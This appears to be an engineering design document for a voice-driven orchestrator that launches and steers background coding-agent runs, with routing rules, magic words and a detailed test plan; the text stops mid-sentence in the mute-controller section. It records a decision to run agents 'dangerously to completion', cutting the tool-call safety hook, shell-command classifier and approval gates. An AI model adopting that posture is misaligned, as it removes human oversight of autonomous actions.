# Panopticon — Engineering Document & Architecture (V0)

> **Audio-only. Voice is the sole operational modality.** This document specifies the V0
> implementation architecture and — first and foremost — **the verification plan that proves it
> works**. Per the operating bar, the verification plan is the centerpiece, not an afterthought:
> every component below carries an inline **Verify** block (the specific unit/integration tests AND
> the end-to-end tests that prove it), §15 consolidates the strategy, and §18 is the
> requirements-traceability matrix.
>
> **Upstream (read from disk, not assumed):** `docs/planning/01-prd.md` (requirements REQ-1..16,
> binding decisions D1–D6, §6 probe gates), `docs/planning/02-design.md` (design decisions D-DD-01..25,
> §11 probe surface, §13 verification matrix), `artifacts/smithering/research/eng-deps.md` (dependency
> stack, ENG-D-01..09), `artifacts/smithering/research/eng-oss.md` (OSS reference architectures:
> Pipecat, OpenWakeWord, Temporal TS SDK, Rhasspy 3).
>
> **Altitude:** this is the *engineering* doc. The PRD says *what* for the user; the design says
> *how it behaves*; this says *how it is built, in what modules, behind what interfaces, proven by
> what tests, depending on what — and which third-party assumptions must be proven in isolation
> before any code is built on them.*
>
> **Posture (non-negotiable, inherited):** assume **no functionality works until a test that was
> capable of failing proves it**. "The agent said it's done" is never evidence. Expect **10×–100×
> more verification than a human would write**. Validate every non-framework third-party API against
> the **real** thing before building on it. Build for observability so a later agent with **no
> context** can debug from traces alone.
>
> **Decision update (V0 scope cut — supersedes prior safety machinery).** Per the V0 decision update we
> **run dangerously to completion** and **trust the voice library (Cue)**: the in-run PreToolUse safety
> hook / safe-executor / dead-man timer (old R1/ENG-A-08), the shell-command classifier (old R9/ENG-A-12),
> the Safe/Explicit/Dangerous mode switching (old R7/ENG-A-11), the bespoke on-device keyword spotter and
> its P-SPOTTER gate (old R10/ENG-A-13), the elaborate `SubscriptionCredentialProvider` machinery (old
> R15/ENG-A-15), and the formal annotated replay corpus / restraint metric (old R16/ENG-A-14/ENG-T-07) are
> **all cut or deferred for V0** (see §8 "(cut in V0)", §0 below, and §20). Mute/unmute words are now plain
> **"mute"/"unmute"**; **ignored ambient speech is silent**; safety later means **sandboxing the process,
> not gating permissions**.
>
> **This revision** closes findings from the adversarial review (R1–R8, recorded in §20.1):
> REQ-1 gains a real consent scheduler, listening-indicator owner, and **whole-session** raw-audio
> persistence guard (§12 — R2); the **acceptance→spawn** flow gets a state owner, MCQ accumulator,
> accept/decline classifier, auto-select and planning transition (§7 — R3); the hot-plane earcon is
> re-grounded on **Cue's deterministic `TextCue` outcome** (recognition stays on Cue — R4); a
> **"working-on-it" timeout ack** is defined (§5.4 — R5); ignored ambient speech is **silent** while
> addressed-command acks remain (§4.2 — R6); and **status and pause-all commands** are added to the
> action contract, handlers and tests (R7); the **pre-spawn resource check** is engineered with
> refusal behavior, observability and tests (§10.1 — R8). *(The old R1 safety-boundary hook is cut —
> see §8.)*
>
> **This revision (second adversarial round)** carried findings R9–R16 (§20.2); several are now
> superseded by the V0 scope cut: the shell-command classifier (R9) and the bespoke unmute spotter
> (R10) are **cut**. Still in force: **per-process `[callsign], pause`/`resume` magic words** with
> handlers and tests so "steer A, pause B" (REQ-13) has a deterministic command path, not free-form NL
> (§4.3 — R11); the **consent line states "Only transcripts are saved"** (AC1.1) with a test asserting
> it (§12 — R12); the output policy is aligned to the PRD — **mute = earcon + one-word TTS (AC2.4),
> halt = earcon + ≤15-word TTS (AC12.3)** (§5.5 — R13); **ignored ambient speech is silent** (§4.2 —
> R14, redefined per the V0 update); credential handling keeps **no raw keys in source** but drops the
> heavy provider machinery — model calls use the host's logged-in OpenAI Codex + Anthropic Claude
> subscriptions (§2, §15.6 — R15, simplified); and suggestion restraint is now a set of **env-tunable
> parameters with documented defaults**, tuned by feel later, not a formal labeled corpus (§15.5 — R16,
> deferred).

---

## 0. The four architectural bets (what the orchestrator decided here)

The architecture is shaped by four bets. Each is a judgment call recorded with an HTML decision doc
under `artifacts/smithering/decisions/` (§20). Everything else in this document is the consequence of
these four. *(A prior fifth bet — safety enforced at the tool-call boundary via an in-run hook — is
**cut in V0**: we run dangerously to completion and trust Cue for any needed confirmation. Safety
later = sandbox the process, not gate permissions. See §8.)*

1. **Three concurrency planes that must never block each other** (`concurrency-planes.html`). The
   product lives or dies on latency asymmetry: the earcon ack should fire in ≤300 ms (REQ-10) while a
   durable spawn may take up to 3 s (REQ-4) and an LLM decision ~100 ms (NG-9 hot loop). We separate
   the system into a **Hot plane** (audio in/out + earcon dispatch, never gated on the LLM/Smithers/TTS),
   a **Decision plane** (Cue policies + cheap/fast LLM, temperature-0), and a **Durable plane**
   (Smithers runs). The planes communicate only through queues; a stall in a slower plane can never
   delay a faster one. **What the hot plane reacts to is Cue's own deterministic `TextCue` decision** —
   recognition stays on Cue (§3.4). The three latency budgets (≤300 ms / ~100 ms / ≤3 s) are
   **env-tunable knobs with documented defaults (§14), not hard guarantees** — tune by feel later.

2. **The provider interface is the universal test boundary** (`provider-test-boundary.html`). All
   four OSS references (eng-oss §5.2) converge on this: every external dependency (ASR, TTS, decision
   LLM, Smithers) sits behind a typed interface, and *everything inside that boundary is tested
   headless via record-replay* (eng-oss §5.3, design §13.1). This is the single decision that makes the
   10×–100× bar physically achievable **and keeps the voice-library integration trivially mockable** —
   no mic, no network, no API keys in the inner test loop.

3. **The Cue↔Smithers seam is one explicit, owned, asynchronous, bidirectional module**
   (`cue-smithers-seam.html`). **Cue and Smithers do not know about each other — they are two
   completely separate things: Cue is essentially I/O into the event loop, Smithers just runs
   background jobs.** This is the novel integration with no prior art (PRD §9, eng-oss §6). We isolate
   it into a single decoupled dispatcher so it is the *one* place the seam is implemented, traced, and
   tested — actions flow out (Cue→Smithers), run-events flow back (Smithers→Cue) (the Temporal lesson,
   eng-oss §3.3).

4. **All routing invariants live in code, never in the LLM** (`invariants-in-code.html`). The
   priority ladder (mute>panic>stop>steer>suggest>pass), routing exclusivity, and the "no steer
   without a callsign" dispatch guard are **deterministic code** — routing *authority* is in code. The
   LLM scores *quality and intent*; it never *authorizes a route*. This is what makes REQ-6/7/12
   testable and deterministic (design §5.5). *(Safety-authority machinery is cut in V0 — see §8 — but
   routing-authority-in-code stays.)*

---

## 1. Architecture overview

### 1.1 Components and the three planes

```
                                  ┌─────────────────── HOT PLANE (≤300 ms, never gated on LLM/Smithers/TTS) ───────────────┐
   mic ──▶ AudioInput ──▶ MuteController ──▶ ASRProvider(Deepgram) ──▶ TranscriptObservation                              │
            (PCM)            │  mute = stop feeding pipeline│                     │                                        │
            │               ▼                              │                     │                                        │
            │       Cue keyword listening ("unmute")       │                     │   EarconEngine ◀── Cue TextCue (det.)   │
            │       — handled by the voice library         │                     │       │ pre-rendered PCM  ▲ "working" ack│
            │                                              │                     │       ▼                  │ (timeout)    │
            └──────────────────────────────────────────────┼─────────────────▶ AudioOutput ──▶ speaker     │              │
                                                            │                     ▲             RoundTripTimer(REQ-10)     │
                                  ┌─────────────────────────┼── DECISION PLANE (~100 ms, temp-0) ──┐  │     └──────────────┘
                                  │   Cue Adapter (owned)    ▼                                       │  │
                                  │     normalize → CueHarness                                       │  │
                                  │       TextCue (deterministic match) ──▶ EarconEngine (hot)       │  │  ← recognition ON Cue
                                  │        ├─ Program: AMBIENT (C2) → SuggestionEngine → Pending     │  │
                                  │        └─ Program: STEERING (C3) → Dispatch (invariants)         │  │
                                  │     policies: TextCue/WordCountCue/IdleCue/IntervalCue           │  │
                                  │     decision LLM (cheap/fast) ── observe.pass (≈90%, SILENT)     │  │
                                  │     MappedActionTool action {type,target,payload}                │  │
                                  └──────────────────────────┬──────────────────────────────────────┘  │
                                                             ▼                                          │
                                  ┌──────────────── SEAM (async, Hono) — bet #3 ───────────────────┐   │
                                  │  ActionDispatcher ─▶ SmithersClient.spawn/steer/pause/halt      │   │
                                  │                      /status                                    │   │
                                  │        ▲                          │                             │   │
                                  │  RunEventNormalizer ◀── streamRunEvents (SSE) ◀─────────────────┘   │
                                  │   (run-event → ≤15-word summary → back to Cue)────────────────────┘
                                  └──────────────────────────┬──────────────────────────────────────┐
                                  ┌─────────────────── DURABLE PLANE (seconds) ──────────────────────▼─┐
                                  │  Smithers durable runs (per process)  +  ProcessRegistry/Lifecycle │
                                  │  ┌─ V0: runs DANGEROUSLY to completion — no in-run approval gate ─┐ │
                                  │  │   (safety later = sandbox the process, not gate permissions)   │ │
                                  │  └───────────────────────────────────────────────────────────────┘ │
                                  │  Pre-spawn ResourceCheck (§10.1)  +  EmergencyStop (REQ-14)         │
                                  └───────────────────────────────────────────────────────────────────┘

   CROSS-CUTTING:  TraceProcessor (every event → structured JSONL, §15.4)  ·  correlationId threads the whole loop
                   Cue JSONL (Cue side)  +  OTel/Langfuse (Smithers side)  ·  read-only Board (REQ-16, off critical path)
```

**The spine (REQ-5), one correlation id end to end:**

```
mic → ASR(isFinal) → CueAdapter → Cue decision
   ├─ [TextCue match → recognized command] → EarconEngine.emit ≤300 ms   (hot plane, fed by Cue's
   │                                                                       deterministic match — never the LLM)
   ├─ [ambient pass — un-addressed chatter] → SILENT (no ack)
   └─ [LLM-scored / MappedActionTool action] → ActionDispatcher → SmithersClient → durable run
            └─ run-event → RunEventNormalizer → CueAdapter → OutputPolicy (silent|earcon|≤15-word TTS) → speaker
                          (V0: the run executes dangerously to completion — no per-tool approval gate)
```

### 1.2 Why this shape

- **Latency asymmetry forces plane separation (bet #1).** REQ-10 demands a ≤300 ms earcon and a <1 s
  p50 round-trip *while* a spawn may legitimately take 3 s and a durable run takes minutes. If the
  earcon path shared a thread/await-chain with the durable path, a slow Smithers spawn would blow the
  ack budget. The earcon is dispatched from the hot plane the instant **Cue's `TextCue` policy
  deterministically matches a magic word**, *before and independent of* the LLM-scored decision and
  any Smithers/TTS work (§3.4; design §3.3, §6.3; eng-oss §1.5 — Pipecat's pre-rendered-PCM-bypasses-
  TTS pattern). Crucially, the latency split is between Cue's *deterministic* policy evaluation (fast)
  and the *LLM-scored / Smithers* work (slow) — **not** between a custom recognizer and Cue.
- **Recognition stays on Cue (R4, the standing constraint).** Magic-word / command triggering is built
  on Cue's `TextCue`. The hot plane never re-implements recognition; it *consumes the deterministic
  outcome Cue already produces* (§3.4). The only fallback — taken only if P-CUE proves `TextCue`
  evaluation cannot meet the 300 ms budget — is an owned adapter pre-matcher that mirrors the exact
  `TextCue` config solely to drive the earcon; it is **never an independent authority** (the
  authoritative route still comes from Cue), and it is recorded as an owned extension and risk (D2).
- **Cue is the substrate; we own only a thin adapter (D2, ENG-D-01/09).** We re-implement nothing Cue
  provides. Every Cue gap we hit is added to the adapter and **recorded as a risk**, never worked
  around by replacing Cue.
- **The seam is the top integration risk, so it is one module (bet #3).** No prior art integrates Cue
  and Smithers (PRD §9, eng-oss §6.2). Concentrating it in `seam/` means the novel risk has exactly
  one home to probe (P-SEAM), trace, and test. Cue and Smithers stay fully decoupled — Cue is I/O into
  the event loop, Smithers runs background jobs; the seam is the single translation layer between them.
- **V0 runs dangerously to completion (was bet #5 — cut).** A prior bet placed a safety gate at the
  agent's tool-call execution boundary (in-run PreToolUse hook + safe-executor). **That is cut for
  V0:** we trust the library and run to completion with no per-step approval gate. Where a confirmation
  is genuinely needed, Cue handles it; minimize approvals. If we want safety later, we **sandbox the
  whole process**, not gate via permissions (see §8).

### 1.3 The data contract (`src/types.ts`) — defined first

Per eng-oss §5.1 / §7 (all four references converge on a single typed contract defined up front), the
**first build artifact** is one shared types file. Every component imports from it; a schema change is
visible in one place. Minimum contents:

```typescript
// The observation produced by any ASRProvider, normalized by the Cue adapter.
interface TranscriptObservation { text: string; isFinal: boolean; speaker: string | null; sessionId: string; latencyMs: number; utteranceId: string }
// A Cue decision the adapter understands (fire or the first-class no-op). `addressed` distinguishes
// an ambient pass (un-addressed chatter) from an addressed pass (a command attempt that resolved to no-op) — R6/§4.2.
type CueDecision = { kind: 'pass'; addressed: boolean; reason: 'ambient'|'near-miss'|'low-confidence'|'dropped'; policy: string; decisionId: string; correlationId: string; meta: DecisionMeta }
                 | { kind: 'action'; action: DispatchedAction; policy: string; decisionId: string; correlationId: string; meta: DecisionMeta }
// What the dispatcher sends across the seam to Smithers. Covers EVERY documented V0 command (R7).
// (V0 scope cut: no setMode/approve/deny — execution modes and the safety approval gate are cut, §8.)
interface DispatchedAction { type: 'spawn'|'steer'|'pause'|'resume'|'halt'|'pauseAll'|'status'; targetUPID: string | null; payload: unknown; correlationId: string }
// NOTE: V0 runs DANGEROUSLY to completion. There is no per-process ExecutionMode, no ToolCallContext
// safety classification, and no ShellVerdict — the Safe/Explicit/Dangerous modes, the in-run
// PreToolUse safety hook, and the shell-command classifier are all CUT in V0 (§8). Safety later =
// sandbox the process, not gate permissions. The ApprovalRequest/ApprovalResolution gate types are
// likewise cut; if Cue needs a confirmation it handles it within the voice library.
// Provider credentials: V0 assumes the host machine is already logged in to its OpenAI Codex and
// Anthropic Claude subscriptions; model calls use those local CLIs/subscriptions. No raw API key in
// source/env/artifact, NEVER written to a log (PRD §6 / §15.6). No bespoke credential-provider type.
// The pending suggestion + accumulated MCQ answers awaiting accept/decline (REQ-4, §7).
interface PendingSuggestion { suggestionId: string; pitch: string; mcqs: string[]; answers: string[]; correlationId: string; expiresAt: number }
// What Smithers streams back, normalized for voice-out.
interface RunEvent { upid: string; runId: string; kind: 'state'|'output'|'blocker'|'completed'; text: string; seq: number }
// One structured log line (the §15.4 contract). The single source of truth.
interface LogEvent { level: 'debug'|'info'|'warn'|'error'; event: string /* verb-noun */; sessionId: string; correlationId?: string; upid?: string; latencyMs?: number; meta: Record<string, unknown> }
// Audio output decision. `working` is the timeout ack (REQ-10 AC10.3, §5.4).
type OutputDecision = { channel: 'silent' } | { channel: 'earcon'; id: EarconId } | { channel: 'ack'; id: AckId } | { channel: 'tts'; text: string; wordCount: number; summarized: boolean }
```

**Verify (the contract):** *type-roundtrip test* — every `LogEvent` and `RunEvent` serializes to
JSONL and deserializes byte-identical (Rhasspy's Wyoming round-trip pattern, eng-oss §4.5/§5.4); a
*schema-presence test* asserts required ids (`sessionId`, and `correlationId` on any loop event) are
non-empty. *Red-before-green:* drop `correlationId` from an action event → the causal-chain
reconstruction test (§13) can no longer join the chain → fails. **This is engineering-only (ENG-T-01).**

---

## 2. Provider interface layer (the test boundary) — REQ-1, REQ-10

All external dependencies sit behind typed interfaces in `src/providers/`. Each interface has (a) a
real implementation gated by a probe, and (b) a record-replay test double. **No component constructs
a provider directly — providers are injected at construction** (eng-oss §4.4, §5.2).

```typescript
interface ASRProvider { stream(audio: ReadableStream): AsyncIterable<TranscriptObservation> }       // src/providers/asr/
interface TTSProvider { speak(text: string, opts?: {voice?: string}): Promise<ReadableStream> }      // src/providers/tts/
interface DecisionLLM { decide(input: DecisionInput): Promise<DecisionOutput> }   // OpenAI-compatible; temp-0   // src/providers/llm/
```

> **V0 scope cut:** there is **no `KeywordSpotter` provider**. Cue (the voice library) already handles
> always-on keyword listening — including hearing "unmute" while the cloud suggestion/routing pipeline
> is paused — so we build no bespoke on-device spotter (§5.3). The provider boundary stays modular and
> easy to mock; all tunable parameters (timeouts, cadence/gates, thresholds, latency budgets, word
> lists) are passed in via documented **ENV variables** (§14), tuned by feel later.

- **ASR — Deepgram Nova-3** (`deepgram.ts`, ENG-D-03, P-ASR). WebSocket streaming; `isFinal` per
  segment; `speaker_0/1` diarization → `SpeakerChangedCue`/`SpeakerWordCue`. Normalized to
  `TranscriptObservation`. Test double: `replay.ts` reads pre-recorded JSONL (the §15.1 spine).
- **TTS — unverified, behind interface** (`<selected>.ts`, ENG-D-04, P-TTS). Provider chosen by the
  probe-as-benchmark; `noop.ts` double for tests. 15-word guard runs *before* `speak()` (§5.2).
- **Decision LLM — cheap/fast only, behind the interface** (ENG-D-05, P-LLM). Temperature-0 for
  record-replay; the hot loop must stay cheap/fast. Model choice follows the **model-assignment matrix
  in the orchestration doc (O4)** — implementation = Codex `gpt-5.5`, verification = Sonnet
  `claude-sonnet-4-6`, review = Codex `gpt-5.5` + Opus `claude-opus-4-8`, planning = Opus
  `claude-opus-4-8` (Fable `claude-fable-5` is an aspirational TODO, not yet wired in). **V0 assumes
  the host machine is already logged in to its OpenAI Codex and Anthropic Claude subscriptions** and
  model calls use those local CLIs/subscriptions — **no raw API key in source** (§2.1). The
  `DecisionLLM` adapter fills Cue's `llmProvider` slot.

### 2.1 Credential handling — host subscriptions, no raw keys (R15, simplified)

PRD §6 is binding on one point: **no raw API keys in source.** Per the V0 decision update we **drop
the bespoke `SubscriptionCredentialProvider` abstraction** and **assume the host machine running this
is already logged in to its OpenAI Codex and Anthropic Claude subscriptions** — the local
CLIs/subscriptions are available, and model calls use those. There is no elaborate credential-provider
machinery to build.

- **Model access** (the hot-loop DecisionLLM and the per-process planner) comes from the host's
  already-authenticated Codex / Claude subscriptions. **No raw API key is hard-coded, committed to the
  repo, written to any artifact, log, JSONL trace, or probe report.**
- **ASR (Deepgram) and TTS** are audio services; their credentials (when needed) are read from the
  environment at construction and are subject to the same rule: **never written to any trace, log, or
  report.**
- The `TraceProcessor` (§13) runs a lightweight **redaction filter** over every `LogEvent.meta` and
  every probe report: any value matching a credential/token shape (bearer tokens, JWTs,
  `Authorization:` headers, provider key patterns) is replaced with `«redacted»` **before** the line is
  emitted. Redaction is fail-closed: an unrecognized-but-secret-shaped string is redacted, not passed.

**Verify (provider layer + secret hygiene):**
- *Unit/integration:* a *boundary-substitution test* constructs every consumer with the replay/noop
  doubles and asserts it runs with zero network/mic (eng-oss §5.2). *Interface-conformance tests*:
  the replay ASR yields the same `TranscriptObservation` shape the real one promises; the noop TTS
  records calls without audio. ***Secret-redaction test*** — feed a `LogEvent`/probe report whose
  `meta` contains a fake bearer token / key and assert the emitted line shows `«redacted»` and the raw
  value appears **nowhere** in any trace/log/report (RBG: disable the redaction filter → the key leaks
  into the JSONL → test fails; restore → redacted). *Red-before-green:* have a consumer `import` a
  concrete provider directly → an architecture lint test (no concrete-provider imports outside
  `providers/`) fails.
- *E2e:* covered per consumer below; the providers themselves are proven by their probes (§17), **each
  of which carries the secret-redaction assertion** (P-ASR/P-TTS/P-LLM, §17). A *whole-session
  secret-scan* greps the full trace/log/report tree after a live run and asserts **zero** key-shaped
  strings (RBG: plant a key in a meta field → scan finds it → fails).
- *Observability:* `provider.init{name, kind}`; `asr.final{utteranceId, latencyMs}`;
  `secret.redacted{count}` (proof the filter ran, never the value).

---

## 3. Cue substrate & owned adapter — REQ-1, REQ-3, REQ-5, REQ-6, REQ-7

`src/cue/` is the only place that imports Cue. **We build on confirmed primitives only (D2,
ENG-D-09); P-CUE is a P0 blocker that gates this entire module (§17).**

- `harness.ts` — constructs `CueHarness` and wires our provider slots (transcription=Deepgram adapter,
  llm=decision-LLM adapter, output=TTS+earcon adapter). Mirrors Rhasspy's `PipelineConfig` slot
  pattern (eng-oss §4.4).
- `adapter.ts` — **the thin owned layer.** Normalizes Cue observations → `TranscriptObservation`
  `{text,isFinal,speaker,sessionId}`; logs every routing decision with a minted `correlationId`;
  triggers earcon emission (Cue decides, adapter plays); turns `MappedActionTool` actions into
  `DispatchedAction`. **Owned extensions recorded as risks (D2):** speaker-label-stability shim
  (routing must survive Deepgram re-labeling), `observe.pass` interception+logging if Cue's pass is
  not truly first-class, and the **earcon fast-path** (§3.4) if `TextCue` evaluation / `cooldownSeconds`
  granularity cannot meet the ≤300 ms budget inside Cue (design §11.1).
- `policies.ts` — wires `TextCue` (magic words), `WordCountCue` (≥60-word gate), `IdleCue`
  (idle-preferring delivery), `IntervalCue`+`cooldownSeconds` (≤1/3 min cadence). All from the real
  Cue API (eng-deps §1).
- `programs.ts` — **two independent `Program`s** for the two routing channels (C2/C3, REQ-6): an
  **ambient** Program (feeds suggestions only) and a **steering** Program (requires callsign
  selection first).

### 3.4 Hot-plane recognition stays on Cue — resolving the latency/substrate contradiction (R4)

The standing constraint requires magic-word recognition to be built on Cue; REQ-10 requires the
earcon ≤300 ms. These are reconciled, not in tension, once we separate Cue's **deterministic** policy
evaluation from its **LLM-scored** decision:

- A magic word is matched by **Cue's `TextCue`** — a literal/regex match over the transcript
  observation. This is deterministic, in-process, and does **not** call the decision LLM or Smithers.
  Recognition is therefore *on Cue* (constraint satisfied, `hot-plane-cue-recognition.html`).
- The Cue adapter routes the **`TextCue` decision outcome straight to `EarconEngine`** in the hot
  plane the moment it resolves — before the SuggestionEngine's LLM scoring, before any
  `MappedActionTool` dispatch, before Smithers. The earcon never waits on the slow path.
- **P-CUE must measure this.** A new assertion in P-CUE (§17): *does a `TextCue` decision resolve
  within the earcon budget (target ≤150 ms to leave headroom under 300 ms)?* If yes, no fallback is
  needed. If Cue batches decisions or `cooldownSeconds` is integer-only such that the deterministic
  match cannot be observed within budget, the **recorded fallback** is an owned adapter pre-matcher
  that mirrors the exact `TextCue` word list/semantics **solely to trigger the earcon** — the
  authoritative route still comes from Cue's decision; the pre-matcher has no routing authority and
  is logged as an owned extension + risk (D2). Either way, no second command authority exists.

**Verify (Cue substrate + hot-plane recognition):**
- *Unit/integration:* *adapter-normalization test* — Cue observation frames → exact
  `TranscriptObservation` shape; *pass-logging test* — every `observe.pass` produces a `route.pass`
  log line (positive assertion, not "nothing logged"); *two-Program isolation test* — an ambient
  observation never reaches the steering Program and vice versa; *recognition-source test* — assert the
  earcon trigger is fed by the Cue `TextCue` decision object (or, in fallback mode, by a pre-matcher
  whose word list is asserted byte-equal to the `TextCue` config), and that no routing decision is
  taken outside Cue. *Red-before-green:* route ambient talk into the steering Program → routing-
  exclusivity test (§4) fails; give the pre-matcher a word not in the `TextCue` config → config-parity
  test fails.
- *E2e:* the canonical scenario (§4/§10) exercises the real harness; the **annotated replay suite**
  (§6) drives recall/false-positive against ground truth through the real Cue decision layer; a
  *recognition-latency e2e* asserts the earcon fires ≤300 ms after `isFinal` while the LLM decision
  is artificially delayed (proves the earcon does not wait on the slow path).
- *Third-party:* **P-CUE** (every row of design §11.1 + the new `TextCue`-latency assertion is a check
  that must be able to fail).
- *Observability:* Cue's built-in `observations.jsonl`/`decisions.jsonl`/`actions.jsonl` (eng-deps
  §7a) + our `route.*` and `earcon.emit{source: cue-textcue|adapter-prematch}` lines keyed by
  `correlationId`.

---

## 4. Routing & dispatch — invariants in code (bet #4) — REQ-6, REQ-7, REQ-8, REQ-12

`src/routing/`. **Routing authority lives here, not in the LLM.**

- `dispatch.ts` — the **priority ladder** `mute > panic > stop > steer > suggest > pass` resolved by a
  deterministic comparator; **routing exclusivity** (each utterance → exactly one of
  {suggestion, steer:X, pass}); the **dispatch invariant** — a steering verb with no in-utterance
  callsign and no open window is *rejected at dispatch* (REQ-6 AC6.1).
- `vocabulary.ts` — the magic-word table (§4.3). **Word lists are an ENV-configured parameter** (§14),
  tuned by feel later. *(V0 scope cut: the prior always-hot vs. state-gated **tiered vocabulary**
  (old D-DD-24) is **deferred** — Cue handles wake/keyword activation. Revisit only if it becomes a
  problem.)*
- `callsigns.ts` — the NATO subset pool (Atlas…Lima) + the **collision guard** (Metaphone +
  phoneme-Levenshtein ≤2 against every active callsign/wake/mute/unmute/panic; D-DD-05); sequential
  assignment; **60 s re-use cooldown** for a halted callsign (D-DD-18).
- `steering-window.ts` — window lifecycle: opens on callsign (incl. one-breath "Atlas, make it
  faster"); routes subsequent speech to that UPID only; closes on "Done"/"Back", 20 s idle, or
  "Abort".
- `handlers.ts` — **one handler per documented command** (R7). Every entry in the §4.3 table maps to
  exactly one handler that emits exactly one `DispatchedAction` (or a local effect). Includes the
  **`status`** handler (emits `{type:'status'}` → §9 returns a ≤15-word active-process summary),
  **`pauseAll`** handler (`{type:'pauseAll'}` → pauses every running process), and the **per-process
  `pause`/`resume`** handlers (R11 — `{type:'pause'|'resume', targetUPID}`; the UPID comes from the
  in-utterance callsign or the open steering window, **never** from free-form NL, so REQ-7/NG-2 hold).
  *(V0 scope cut: there are no execution-mode commands — Safe/Explicit/Dangerous switching is removed;
  V0 runs dangerously to completion, §8.)*

### 4.2 Audible routing acks — ignored ambient speech is SILENT (R6, R14 — redefined per V0 update)

Per the V0 decision update, **ignored ambient speech makes no sound.** `observe.pass` / `route.pass`
for un-addressed chatter is **silent by default** — of course ignored ambient speech should make no
noise. Earcons remain for explicit **state transitions** (wake, spawn, mute, halt, etc.) and for
acknowledging **addressed** commands; un-addressed / ignored speech is silent. This replaces the prior
"every routed utterance gets a distinct audible ack" engineering (the old two-layer-ack-for-all-
utterances model is removed).

| Route | Case | Ack (Layer B, non-tonal — D-DD-23) |
|---|---|---|
| `route.suggestion` | fed the idea engine | single soft "whoosh" |
| `route.steer:X` | steered process X | brief double-click "tick-tick" |
| `route.pass` **addressed** | a command attempt (wake/callsign/command-shaped) that resolved to no-op | distinct **"declined" tick** (single low non-tonal blip) |
| `route.pass` **ambient** | un-addressed chatter that was never a command attempt | **SILENT — no sound** |

`CueDecision.addressed` (§1.3) carries the addressed/ambient distinction (set deterministically in
code — was a wake/callsign/command token present? — never by the LLM): an **addressed** pass gets the
declined tick (the user spoke a command that resolved to no-op, so they get acknowledged), while an
**ambient** pass is silent. There is no `ambientPassAck` knob and no PRD-amendment gate — silence for
ignored ambient speech is the requirement, not a configurable behavior.

**Verify (routing & dispatch):**
- *Unit/integration:* *priority-ladder test* (RBG: demote mute below panic → fails); *dispatch-invariant
  test* (RBG: remove the guard → un-addressed talk steers → fails); *routing-exclusivity test*;
  *suggestion-gating test* ("Yes" outside an active suggestion is inert — RBG: accept "Yes" with no
  pending suggestion → a casual "yes" spawns → fails); *collision-guard test* (RBG: add a callsign
  within distance ≤2 → must reject); *determinism test* (replay same transcript N× → identical
  decisions); *window-lifecycle test* (open on callsign; close on Done/20 s/Abort); *re-use cooldown
  test* (halted callsign unavailable 60 s); *command-coverage test* — every row of the §4.3 table maps
  to **exactly one** handler and one `DispatchedAction.type` (RBG: drop the `status` handler → a
  documented command has no handler → fails); *command-coverage test (incl. per-process pause/resume)*
  — the §4.3 `pause`/`resume` rows each map to one handler emitting `{type:'pause'|'resume',
  targetUPID}`; *addressed-vs-ambient-pass test* — an addressed near-miss yields `pass{addressed:true}`→
  declined tick; ambient chatter yields `pass{addressed:false}`→ **silence** (RBG: emit any sound for
  an ambient pass → the "ignored ambient is silent" test fails);
  *per-process-pause routing test* — "[callsign], pause" / select-then-"Pause" dispatches `pause` to
  **that UPID only**, and a free-form NL "pause the second one" with no callsign/window is **rejected
  at dispatch** (REQ-7/NG-2; RBG: route NL "pause B" to a pause action → fails); symmetric for resume.
- *E2e:* live multi-utterance script — un-addressed talk only ever feeds suggestions and **makes no
  sound**; one-breath select-and-steer routes correctly; near-homophone of a callsign in casual speech
  does **not** mis-select; each documented command (incl. status, pause-all, **per-process
  pause/resume**) yields its documented effect; **"Atlas, pause" pauses Atlas while Bravo keeps
  running** (the REQ-13 "steer A, pause B" path, §10); an addressed near-miss emits the declined tick;
  an undocumented ambient phrase yields no command and no sound.
- *Third-party:* P-CUE (`TextCue`, `SpeakerWordCue`, two-Program routing), P-PHONETIC (the
  Metaphone/phoneme-distance library produces stable, reproducible codes).
- *Observability:* `command.recognize{phrase, matchedCommand|null, tier, distanceScore}`,
  `route{utteranceId, route, targetUPID|null, addressed, ackKind}`.

### 4.3 V0 magic-word vocabulary (every command → handler → action)

Activation is handled by Cue's wake/keyword recognition; the "Activation" column below notes whether a
word is heard anytime or only inside an open suggestion/steering window. *(V0 scope cut: there is no
bespoke always-hot vs. state-gated **tiered** vocabulary — deferred, §4 `vocabulary.ts`.)*

| Command | Spoken form | Activation | Handler → `DispatchedAction` / effect |
|---|---|---|---|
| Wake | "Panop" | anytime | opens active-listen window (local) |
| Accept | "Yes"/"Accept"/"Do it" | in suggestion | §7 acceptance → `{type:'spawn'}` |
| Decline | "No"/"Nah"/"Skip" | in suggestion | §7 decline → no-op |
| Select-and-steer | "[callsign], [instruction]" | anytime (callsign) | select + `{type:'steer'}` |
| Select only | "[callsign]" | anytime | open steering window (local) |
| Steer | (after select) "[instruction]" | in window | `{type:'steer'}` |
| End steering | "Done"/"Back" | in window | close window (local) |
| **Pause (targeted)** | "[callsign], pause" *or* (after select) "Pause" | anytime (callsign) / in window | `{type:'pause', targetUPID}` |
| **Resume (targeted)** | "[callsign], resume" *or* (after select) "Resume" | anytime (callsign) / in window | `{type:'resume', targetUPID}` |
| **Pause all** | "Pause all" | anytime | `{type:'pauseAll'}` |
| **Status** | "Status" | anytime | `{type:'status'}` → ≤15-word summary |
| Stop (targeted) | "Stop"/"Halt" | anytime | `{type:'halt', targetUPID}` |
| Panic (global) | "Abort" | anytime | halt all + close windows |
| Mute | "mute" | anytime | stop feeding audio into the suggestion/routing pipeline (§5.3) |
| Unmute | "unmute" | anytime (Cue hears it while muted) | resume feeding the pipeline (§5.3) |

---

## 5. Audio output: earcons, output policy, mute controller, timeout ack — REQ-2, REQ-9, REQ-10

`src/audio/`.

- `earcons.ts` — **hot plane** (bet #1). The 5 tonal state earcons (E1–E5) + the mute tone are
  **pre-rendered PCM**, dispatched directly to `AudioOutput`, **never** touching LLM/Smithers/TTS or
  the network (eng-oss §1.5). Layer B routing/latency acks (non-tonal clicks/whoosh/pulse) are a
  separate, disjoint layer (D-DD-23). Earcon fires ≤300 ms after Cue's `TextCue` match of a recognized
  command (§3.4, REQ-10 AC10.1).
- `output-policy.ts` — the triage map (§5.5): each trigger class → exactly one of
  {silent, earcon, ack, tts}; default = silent (90%-silence target, REQ-9 AC9.1); the **15-word hard
  guard** counts words and, if >15, summarizes via the cheap/fast LLM before submission; **never-recite**
  rule strips file names/diffs/URLs/stack traces. Thresholds (silence target, word cap, summarizer
  budget) are ENV-tunable (§14).
- `mute-controller.ts` — **the mute fork** (bet #1, REQ-2, design §12). Per the V0 update, **muted
  means: stop feeding audio into the suggestion/routing pipeline** — the cloud ASR / suggestion stream
